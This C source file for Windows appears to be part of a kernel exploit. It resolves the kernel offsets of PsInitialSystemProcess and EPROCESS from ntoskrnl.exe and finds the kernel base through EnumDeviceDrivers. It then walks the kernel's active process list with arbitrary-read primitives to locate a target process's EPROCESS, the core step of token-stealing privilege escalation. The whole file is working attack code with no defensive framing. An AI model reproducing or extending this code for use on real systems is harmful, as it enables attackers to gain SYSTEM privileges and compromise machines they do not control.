#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include "rt.h"


static UINT32 offsPsInitialSystemProcess;   // RVA of PsInitialSystemProcess
static UINT16 offsUniqueProcessId;          // offset of UniqueProcessId in EPROCESS
static UINT16 offsActiveProcessLinks;       // offset of ActiveProcessLinks


BOOL FindKernelPsInitialSystemProcessOffset(void)
{
    HMODULE hDisk = LoadLibraryExA("ntoskrnl.exe", NULL,
                                   DONT_RESOLVE_DLL_REFERENCES);
    if (!hDisk) return FALSE;

    FARPROC pSym = GetProcAddress(hDisk, "PsInitialSystemProcess");
    if (!pSym) return FALSE;

    offsPsInitialSystemProcess = 
      (UINT32)((UINT_PTR)pSym - (UINT_PTR)hDisk);
    FreeLibrary(hDisk);
    return TRUE;
}

BOOL FindProcessUniqueProcessIdOffset(void)
{
    HMODULE hDisk = LoadLibraryExA("ntoskrnl.exe", NULL,
                                   DONT_RESOLVE_DLL_REFERENCES);
    if (!hDisk) return FALSE;

    FARPROC pFn = GetProcAddress(hDisk, "PsGetProcessId");
    if (!pFn) { FreeLibrary(hDisk); return FALSE; }

    // on x64 the opcode is at +3, on x86 at +2
  #ifdef _WIN64
    UINT8 *instr = (UINT8*)pFn + 3;
  #else
    UINT8 *instr = (UINT8*)pFn + 2;
  #endif

    
    offsUniqueProcessId = *(UINT16*)instr;
    FreeLibrary(hDisk);

    if (offsUniqueProcessId > 0x0FFF) return FALSE;
    return TRUE;
}


BOOL FindProcessActiveProcessLinksOffset(void)
{
    if (!offsUniqueProcessId) return FALSE;
    offsActiveProcessLinks = offsUniqueProcessId + sizeof(HANDLE);
    return TRUE;
}


UINT64 GetKernelBase(void)
{
    LPVOID drivers[16];
    DWORD cb;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cb))
        return 0;
    return (UINT64)drivers[0];
}

// -----------------------------------------------------------------------------
// 5) Walk the process list to find EPROCESS for a given PID
// -----------------------------------------------------------------------------
UINT64 GetEprocessByPid(DWORD targetPid)
{
    // read the global PsInitialSystemProcess pointer
    UINT64 krnlBase = GetKernelBase();
    UINT64 initPtr = 0;
    Read64(krnlBase + offsPsInitialSystemProcess, &initPtr);

    // read the ActiveProcessLinks.Flink from the system EPROCESS
    UINT64 listHead = initPtr + offsActiveProcessLinks;
    UINT64 firstEntry = 0, currEntry = 0;
    Read64(listHead, &firstEntry);
    currEntry = firstEntry;

    do {
        // back up from the LIST_ENTRY to EPROCESS base
        UINT64 eproc = currEntry - offsActiveProcessLinks;

        // read this process’s UniqueProcessId
        DWORD pid = 0;
        Read32(eproc + offsUniqueProcessId, &pid);
        if (pid == targetPid)
            return eproc;

        Read64(currEntry, &currEntry);
    } while (currEntry != firstEntry);

    return 0;  
}